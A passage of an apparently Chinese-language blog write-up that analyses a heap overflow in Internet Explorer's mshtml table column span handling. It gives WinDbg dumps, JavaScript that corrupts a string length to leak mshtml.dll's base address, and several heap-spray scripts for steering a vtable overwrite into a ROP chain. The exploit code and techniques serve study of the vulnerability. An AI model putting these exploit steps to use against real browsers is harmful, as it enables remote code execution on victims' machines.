class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:005&gt; bp mshtml!CTableCol::GetAAspan</span><br><span class=\"line\">0:005&gt; g</span><br><span class=\"line\">Breakpoint 2 hit</span><br><span class=\"line\">eax=004a8e80 ebx=004dee40 ecx=00000032 edx=00000009 esi=030c110c edi=004a8e80</span><br><span class=\"line\">eip=6872a6cb esp=0254bfbc ebp=0254c064 iopl=0         nv up ei pl zr na pe nc</span><br><span class=\"line\">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class=\"line\">mshtml!CTableCol::GetAAspan:</span><br><span class=\"line\">6872a6cb 8bff            mov     edi,edi</span><br><span class=\"line\">0:005&gt; gu</span><br><span class=\"line\">eax=00000009 ebx=004dee40 ecx=00000002 edx=004cbf88 esi=030c110c edi=004a8e80</span><br><span class=\"line\">eip=6893f31f esp=0254bfc0 ebp=0254c064 iopl=0         nv up ei pl nz na po nc</span><br><span class=\"line\">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class=\"line\">mshtml!CTableLayout::CalculateMinMax+0x3ac:</span><br><span class=\"line\">6893f31f 3de8030000      cmp     eax,3E8h</span><br><span class=\"line\">0:005&gt; dd 030c110c L300</span><br><span class=\"line\">030c110c  00000045 2baf3432 88000000 000000fa</span><br><span class=\"line\">030c111c  00410041 00410041 00410041 00410041</span><br><span class=\"line\">030c112c  00410041 00410041 00410041 00410041</span><br><span class=\"line\">030c113c  00410041 00410041 00410041 00410041</span><br><span class=\"line\">030c114c  00410041 00410041 00410041 00410041</span><br><span class=\"line\">030c115c  00410041 00410041 00410041 00410041</span><br><span class=\"line\">030c116c  00410041 00410041 00410041 00410041</span><br><span class=\"line\">030c117c  00410041 00410041 00410041 00410041</span><br><span class=\"line\">030c118c  00410041 00410041 00410041 00410041</span><br><span class=\"line\">030c119c  00410041 00410041 00410041 00410041</span><br><span class=\"line\">030c11ac  00410041 00410041 00410041 00410041</span><br><span class=\"line\">030c11bc  00410041 00410041 00410041 00410041</span><br><span class=\"line\">030c11cc  00410041 00410041 00410041 00410041</span><br><span class=\"line\">030c11dc  00410041 00410041 00410041 00410041</span><br><span class=\"line\">030c11ec  00410041 00410041 00410041 00410041</span><br><span class=\"line\">030c11fc  00410041 00410041 00410041 00410041</span><br><span class=\"line\">030c120c  00410041 00410041 00000041 2baf3453</span><br><span class=\"line\">030c121c  88000000 000000fa 00420042 00420042 # 0xfa为字符串size</span><br><span class=\"line\">030c122c  00420042 00420042 00420042 00420042</span><br><span class=\"line\">030c123c  00420042 00420042 00420042 00420042</span><br><span class=\"line\">030c124c  00420042 00420042 00420042 00420042</span><br><span class=\"line\">030c125c  00420042 00420042 00420042 00420042</span><br><span class=\"line\">030c126c  00420042 00420042 00420042 00420042</span><br><span class=\"line\">030c127c  00420042 00420042 00420042 00420042</span><br><span class=\"line\">030c128c  00420042 00420042 00420042 00420042</span><br><span class=\"line\">030c129c  00420042 00420042 00420042 00420042</span><br><span class=\"line\">030c12ac  00420042 00420042 00420042 00420042</span><br><span class=\"line\">030c12bc  00420042 00420042 00420042 00420042</span><br><span class=\"line\">030c12cc  00420042 00420042 00420042 00420042</span><br><span class=\"line\">030c12dc  00420042 00420042 00420042 00420042</span><br><span class=\"line\">030c12ec  00420042 00420042 00420042 00420042</span><br><span class=\"line\">030c12fc  00420042 00420042 00420042 00420042</span><br><span class=\"line\">030c130c  00420042 00420042 00420042 00420042</span><br><span class=\"line\">030c131c  00000042 2baf3474 8c000000 687f84f8</span><br><span class=\"line\">030c132c  0049ca00 030bce00 687f8690 00000001 # 这里0x687f8690是需要leak的地址</span><br><span class=\"line\">030c133c  00000000 01080809 ffffffff 00000000</span><br><span class=\"line\">030c134c  00000000 00000000 ffffffff 00000080</span><br><span class=\"line\">030c135c  ffffffff 00000000 00000000 00000000</span><br><span class=\"line\">030c136c  00000000 00000000 00000024 00000020</span><br><span class=\"line\">030c137c  00000000 00000000 00000000 00000000</span><br><span class=\"line\">030c138c  00000000 00000000 00000000 00000000</span><br><span class=\"line\">030c139c  00000000 00000000 00000000 00000000</span><br><span class=\"line\">030c13ac  00000000 00000000 00000000 00000000</span><br><span class=\"line\"></span><br><span class=\"line\">0:005&gt; ln 687f8690 </span><br><span class=\"line\">(687f8690)   mshtml!CButtonLayout::`vftable&apos;   |  (687f8738)   mshtml!CObjectImageLayout::`vftable&apos;</span><br><span class=\"line\">Exact matches:</span><br><span class=\"line\">    mshtml!CButtonLayout::`vftable&apos; = &lt;no type information&gt;</span><br></pre></td></tr></table></figure>\n<p>需要利用堆溢出，通过js代码动态更新span属性值来达到目的。每一个都会写入一串0x1c的样式，所以要修改size的话需要<code>0x30c121c - 0x30c110c / 0x1c = 9 + 1 = 10</code>，再将span增加10，即修改span为19。写完后，字符串B的长度由0x000000fa变成了0x00010048，因此该对象能访问的内存空间变广了，这样我们就能通过如下代码获取到CButtonLayout对象的vftable值，最计算得到mshtml.dll模块的基址。</p>\n<p>此段exp如下：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">leak</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> leak_col = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">\"132\"</span>);</span><br><span class=\"line\">  leak_col.width = <span class=\"string\">\"41\"</span>;</span><br><span class=\"line\">  leak_col.span = <span class=\"string\">\"19\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">setTimeout(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;leak(), <span class=\"number\">400</span>&#125;);</span><br></pre></td></tr></table></figure>\n<p>然后获取模型基址的exp如下</p>\n<p><strong>注：这里的bl[498]稍微令人有些费解，不过可以通过在exp中判断每个字符串的size是否被修改过从而定位到溢出的BSTR对象，类似漏洞战争一书中的exp</strong></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//计算mshtml模块基址，并通过堆喷进行rop和shellcode布局</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get_leak</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> str_addr = strtoint(bl[<span class=\"number\">498</span>].substring((<span class=\"number\">0x100</span><span class=\"number\">-6</span>)/<span class=\"number\">2</span>+<span class=\"number\">11</span>,(<span class=\"number\">0x100</span><span class=\"number\">-6</span>)/<span class=\"number\">2</span>+<span class=\"number\">13</span>));</span><br><span class=\"line\">    str_addr = str_addr - <span class=\"number\">1410704</span>;</span><br><span class=\"line\">    <span class=\"comment\">//setTimeout(function()&#123;heapspray(str_addr)&#125;, 50);</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>其中红色位置，字符串长度被修改为0x10048，就可以溢出得到蓝色位置的值。</p>\n<h4 id=\"Heap-Spray\"><a href=\"#Heap-Spray\" class=\"headerlink\" title=\"Heap Spray\"></a>Heap Spray</h4><p>在得到mshtml.dll模块的基址后，我们就有机会构造相应的ROP链来实现想要的功能了，那么现在需要解决另外一个问题，也就是如何让程序跳转到我们的ROP链执行。<strong>此exp首先会利用堆喷技术将ROP链中的gadget地址和参数以及后面用到的shellcode布局到进程地址空间中的固定位置，而后再利用堆溢出重写CButtonLayout对象的虚表指针，使其指向前面提到的固定位置，这样当虚函数被调用时就会跳转到我们的ROP链中。</strong></p>\n<p>将原先的width属性值设置为127888，那么样式值为<strong>127888*0x100=0x079f6da0</strong>，也就是可以把虚表指针覆盖为0x79f6da0，那么只要能通过堆喷将rop链的地址控制到这个地址即可。其实这个地址是事先计算出来的，下面会讲到。</p>\n<p>P.S.：一些Windbg堆调试技巧如下：</p>\n<blockquote>\n<p>Windbg调试堆：</p>\n<p>!heap -stat显示被调试进程的所有堆使用情况</p>\n<p>!heap -a xxxxxxxx 显示关于xxxxxxxx处堆的详细情况，输出会有些多</p>\n<p>!heap -stat -h xxxxxxxx 查看xxxxxxxx堆的分配统计数据</p>\n<p>!heap -flt s 7ffe0 查看大小为7ffe0的内存，在堆喷的时候可以方便的找到payload所在的地址</p>\n<p>0:007&gt; !<strong>heap</strong> <strong>-flt</strong> <strong>s</strong> 7<strong>ffe0</strong><br> _<strong>HEAP</strong> @ 140000<br>   HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state                 // 这里HEAP_ENTRY是堆的头部，UserPtr是BSTR对象头部<br>     02240018 fffc 0000  [0b]   02240020    7ffe0 - (busy VirtualAlloc)<br>     01fe0018 fffc fffc  [0b]   01fe0020    7ffe0 - (busy VirtualAlloc)<br>     022c0018 fffc fffc  [0b]   022c0020    7ffe0 - (busy VirtualAlloc)<br>     02340018 fffc fffc  [0b]   02340020    7ffe0 - (busy VirtualAlloc)<br>…<br>…</p>\n<p>0:007&gt; <strong>dd</strong> 02240018<br>02240018  00000020 00000<strong>b00</strong> 0007<strong>ffd4</strong> 90909090<br>02240028  90909090 90909090 90909090 90909090<br>02240038  90909090 90909090 90909090 90909090</p>\n<p>!heap -p -a 0x0c0c0c0c查看0x0c0c0c0c处的数据属于哪个堆:</p>\n</blockquote>\n<hr>\n<p><strong>堆喷射内存布局</strong></p>\n<p>在浏览器中分配的字符串都会被转换为unicode，所以为了准确传递字符，我们需要使用JavaScript中的unescape函数，这个函数用于解码字符串，所以用已经是unicode的字符串，在内存中就不会再次被转换为unicode了，用%u加在每两字节之前，注意两字节要反序排列。分配字符串后会变成BSTR字符串对象，含有4字节的头信息和两个NULL字节的结尾。</p>\n<p>一般的堆喷射内存布局就是大量的nop指令(也称为滑板指令)加上shellcode，shellcode放在每个块的尾部，只要保证喷射堆块足够大，那么预测的地址处就会是nop指令，然后执行到shellcode。</p>\n<p>在堆喷中最著名的地址要数<strong>0x0c0c0c0c</strong>了，解释一下为什么使用这个地址。如果在Exploit中通过覆盖堆栈中的虚表的话，使用这个地址就会十分合适，当虚函数被调用时，先取得栈中的对象指针，通过对象指针取得虚表指针，然后在虚表内适当偏移处取得函数指针执行，示意图:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> Stack</span><br><span class=\"line\">+---------+          Object</span><br><span class=\"line\">| obj_ptr | ----&gt;  +--------+        Vtable</span><br><span class=\"line\">+---------+        |p_Vtable| ---&gt; +-------+</span><br><span class=\"line\">|         |        +--------+      |p_func1| ----&gt; func1</span><br><span class=\"line\">+---------+        |        |      +-------+</span><br><span class=\"line\">|         |        +--------+</span><br><span class=\"line\">+---------+</span><br></pre></td></tr></table></figure>\n<p>假如将obj_ptr覆盖为0x0c0c0c0c，将0x0c0c0c0c地址内的内容填为x0cx0cx0cx0c，那么顺着这条调用链，最后还是会调用0x0c0c0c0c地址处的指令，而且:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">004010A0  0C 0C   OR AL,0C</span><br><span class=\"line\">004010A2  0C 0C   OR AL,0C</span><br></pre></td></tr></table></figure>\n<p>计算需要多大的内存块才能喷到0x0c0c0c0c</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x0c0c0c0c = 202116108</span><br><span class=\"line\">202116108字节(b)=192.7529411兆字节(mb)</span><br></pre></td></tr></table></figure>\n<p>但由于分配的起始地址并不是从零开始，所以实际中并不需要那么大的内存，<strong>还有一个要注意的点就是unescape返回的对象在用.length计算长度时返回的是实际长度的一半</strong></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; s = <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u4142%u4344%u4546\"</span>)</span><br><span class=\"line\">&gt; s.length</span><br><span class=\"line\"><span class=\"number\">3</span></span><br></pre></td></tr></table></figure>\n<p>一份堆喷射的脚本可能看起来像这样：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">    tag = <span class=\"built_in\">unescape</span>(<span class=\"string\">'%u4141%u4141'</span>);</span></span><br><span class=\"line\"><span class=\"javascript\">    chunk = <span class=\"string\">''</span>;</span></span><br><span class=\"line\"><span class=\"undefined\">    chunksize = 0x1000;</span></span><br><span class=\"line\"><span class=\"undefined\">    nr_of_chunks = 200;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">for</span> (counter = <span class=\"number\">0</span>; counter &lt; chunksize; counter++) &#123; <span class=\"comment\">// 填充0x1000的NOP指令</span></span></span><br><span class=\"line\"><span class=\"javascript\">        chunk += <span class=\"built_in\">unescape</span>(<span class=\"string\">'%u9090%u9090'</span>);</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">    chunk = chunk.substring(0, chunksize - tag.length);</span></span><br><span class=\"line\"><span class=\"javascript\">    testarray = <span class=\"keyword\">new</span> <span class=\"built_in\">Array</span>();</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">for</span> (counter = <span class=\"number\">0</span>; counter &lt; nr_of_chunks; counter++) &#123; <span class=\"comment\">// 0x200个chunk</span></span></span><br><span class=\"line\"><span class=\"undefined\">        testarray[counter] = tag + chunk;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><strong>XP下IE6和IE7的堆喷</strong></p>\n<p>可以用IE Collection安装多个版本的IE，这里在XP SP3上安装了IE6和IE7用于调试。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">var</span> shellcode = <span class=\"built_in\">unescape</span>(<span class=\"string\">'%u4141%u4141'</span>);</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">var</span> bigblock = <span class=\"built_in\">unescape</span>(<span class=\"string\">'%u9090%u9090'</span>);</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">var</span> headsize = <span class=\"number\">20</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">var</span> slackspace = headsize + shellcode.length;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">while</span> (bigblock.length &lt; slackspace) bigblock += bigblock;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">var</span> fillblock = bigblock.substring(<span class=\"number\">0</span>, slackspace);</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">var</span> block = bigblock.substring(<span class=\"number\">0</span>, bigblock.length - slackspace);</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">while</span> (block.length + slackspace &lt; <span class=\"number\">0x40000</span>) block = block + block + fillblock;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">var</span> memory = <span class=\"keyword\">new</span> <span class=\"built_in\">Array</span>();</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">500</span>; i++) &#123;memory[i] = block + shellcode;&#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>分配了500块大小为0x40000 * 2的内存块(.length返回大小为实际大小一半)，结果：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:009&gt; dd 0c0c0c0c</span><br><span class=\"line\">0c0c0c0c  90909090 90909090 90909090 90909090</span><br><span class=\"line\">0c0c0c1c  90909090 90909090 90909090 90909090</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n<p>可以尝试多次，发现都是成功的，查看堆的状态：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:009&gt; !heap -stat -h 00140000</span><br><span class=\"line\"> heap @ 00140000</span><br><span class=\"line\">group-by: TOTSIZE max-display: 20</span><br><span class=\"line\">    size     #blocks     total     ( %) (percent of total busy bytes)</span><br><span class=\"line\">    7ffe0 1f5 - fa7c160  (99.78)</span><br><span class=\"line\">    8000 1 - 8000  (0.01)</span><br><span class=\"line\">    7fe0 1 - 7fe0  (0.01)</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n<p>基本上块的大小都是0x7ffe0，也就是所分配的0x40000 * 2。</p>\n<hr>\n<p>回到我们的exp，由于堆空间管理的<strong>对齐</strong>（类似Glibc的对齐）和彼此相邻的性质，分配的堆空间将类似下面这个样子：</p>\n<p>这一块参考如下文章（<a href=\"http://www.exploit-monday.com/2011/08/targeted-heap-spraying-0x0c0c0c0c-is.html）：\" target=\"_blank\" rel=\"noopener\">http://www.exploit-monday.com/2011/08/targeted-heap-spraying-0x0c0c0c0c-is.html）：</a></p>\n<p><img src=\"http://4.bp.blogspot.com/-xM3evabUguA/TlulZu6npaI/AAAAAAAAAB0/afhXWHrFcd0/s1600/spray_diagram.png\" alt=\"img\"></p>\n<blockquote>\n<p>有一种方法允许你可靠地分配shellcode，使得它既处在可预测的位置，又和内存页面对齐（64K对齐）。为什么要64K对齐？因为堆页地址的十六进制末尾4位为0000。因此，任何javascript字符串将是6个字节长加上Unicode编码字符串的长度。此外，使用VirtualAlloc分配的堆块长度为0x20字节。因此，通过VirtualAlloc分配的shellcode将始终位于偏移0x24处。另外，由于每个分配产生一个64K对齐的地址，我们可以进行一系列完全等于64K的字符串分配。这样，我们的shellcode开头将始终位于类似（0xXXXX0024）的地址。</p>\n<p>以下Javascript代码分配16个64K字符串（即1MB）的数组。注意，第16个分配考虑了堆头和字符串长度，因此只分配了一兆字节。然后将得到的数组分配一百次，从而精确分配100MB。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; <span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">&gt; <span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">&gt; <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">&gt; <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">heapspray</span>(<span class=\"params\"></span>)</span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">&gt; <span class=\"keyword\">var</span> shellcode = <span class=\"string\">\"u\\4141\"</span>;</span></span><br><span class=\"line\"><span class=\"undefined\">&gt; </span></span><br><span class=\"line\"><span class=\"javascript\">&gt; <span class=\"keyword\">while</span> (shellcode.length &lt; <span class=\"number\">100000</span>)</span></span><br><span class=\"line\"><span class=\"undefined\">&gt;  shellcode = shellcode + shellcode;</span></span><br><span class=\"line\"><span class=\"undefined\">&gt; </span></span><br><span class=\"line\"><span class=\"javascript\">&gt; <span class=\"keyword\">var</span> onemeg = shellcode.substr(<span class=\"number\">0</span>, <span class=\"number\">64</span>*<span class=\"number\">1024</span>/<span class=\"number\">2</span>);</span></span><br><span class=\"line\"><span class=\"undefined\">&gt; </span></span><br><span class=\"line\"><span class=\"javascript\">&gt; <span class=\"keyword\">for</span> (i=<span class=\"number\">0</span>; i&lt;<span class=\"number\">14</span>; i++) &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">&gt;  onemeg += shellcode.substr(0, 64*1024/2);</span></span><br><span class=\"line\"><span class=\"undefined\">&gt; &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">&gt; </span></span><br><span class=\"line\"><span class=\"undefined\">&gt; onemeg += shellcode.substr(0, (64*1024/2)-(38/2));</span></span><br><span class=\"line\"><span class=\"undefined\">&gt; </span></span><br><span class=\"line\"><span class=\"javascript\">&gt; <span class=\"keyword\">var</span> spray = <span class=\"keyword\">new</span> <span class=\"built_in\">Array</span>();</span></span><br><span class=\"line\"><span class=\"undefined\">&gt; </span></span><br><span class=\"line\"><span class=\"javascript\">&gt; <span class=\"keyword\">for</span> (i=<span class=\"number\">0</span>; i&lt;<span class=\"number\">100</span>; i++) &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">&gt;  spray[i] = onemeg.substr(0, onemeg.length);</span></span><br><span class=\"line\"><span class=\"undefined\">&gt; &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">&gt; &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">&gt; </span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">&gt; <span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">&gt; <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"button\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"Spray the heap\"</span> <span class=\"attr\">onclick</span>=<span class=\"string\">\"heapspray()\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">input</span>&gt;</span></span><br><span class=\"line\">&gt; <span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">&gt; <span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<blockquote>\n<p>然后运行Windbg调试：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; !heap -stat</span><br><span class=\"line\">&gt; </span><br><span class=\"line\">&gt; _HEAP 00360000</span><br><span class=\"line\">&gt;   Segments            00000001</span><br><span class=\"line\">&gt;       Reserved  bytes 00100000</span><br><span class=\"line\">&gt;       Committed bytes 000f1000</span><br><span class=\"line\">&gt;   VirtAllocBlocks     00000001</span><br><span class=\"line\">&gt;       VirtAlloc bytes 035f0000</span><br><span class=\"line\">&gt; _HEAP 035b0000</span><br><span class=\"line\">&gt;   Segments            00000001</span><br><span class=\"line\">&gt;       Reserved  bytes 00040000</span><br><span class=\"line\">&gt;       Committed bytes 00019000</span><br><span class=\"line\">&gt;   VirtAllocBlocks     00000000</span><br><span class=\"line\">&gt;       VirtAlloc bytes 00000000</span><br><span class=\"line\">&gt; _HEAP 00750000</span><br><span class=\"line\">&gt;   Segments            00000001</span><br><span class=\"line\">&gt;       Reserved  bytes 00040000</span><br><span class=\"line\">&gt;       Committed bytes 00012000</span><br><span class=\"line\">&gt;   VirtAllocBlocks     00000000</span><br><span class=\"line\">&gt;       VirtAlloc bytes 00000000</span><br><span class=\"line\">&gt; _HEAP 00270000</span><br><span class=\"line\">&gt;   Segments            00000001</span><br><span class=\"line\">&gt;       Reserved  bytes 00010000</span><br><span class=\"line\">&gt;       Committed bytes 00010000</span><br><span class=\"line\">&gt;   VirtAllocBlocks     00000000</span><br><span class=\"line\">&gt;       VirtAlloc bytes 00000000</span><br><span class=\"line\">&gt; _HEAP 02e20000</span><br><span class=\"line\">&gt;   Segments            00000001</span><br><span class=\"line\">&gt;       Reserved  bytes 00040000</span><br><span class=\"line\">&gt;       Committed bytes 00001000</span><br><span class=\"line\">&gt;   VirtAllocBlocks     00000000</span><br><span class=\"line\">&gt;       VirtAlloc bytes 00000000</span><br><span class=\"line\">&gt; _HEAP 00010000</span><br><span class=\"line\">&gt;   Segments            00000001</span><br><span class=\"line\">&gt;       Reserved  bytes 00010000</span><br><span class=\"line\">&gt;       Committed bytes 00001000</span><br><span class=\"line\">&gt;   VirtAllocBlocks     00000000</span><br><span class=\"line\">&gt;       VirtAlloc bytes 00000000</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<blockquote>\n<p>查看VirtAlloc bytes 字段很大的分配，第一个地址就是我们所感兴趣的堆地址_HEAP 00360000</p>\n<p>然后，查看堆句柄的分配统计</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span 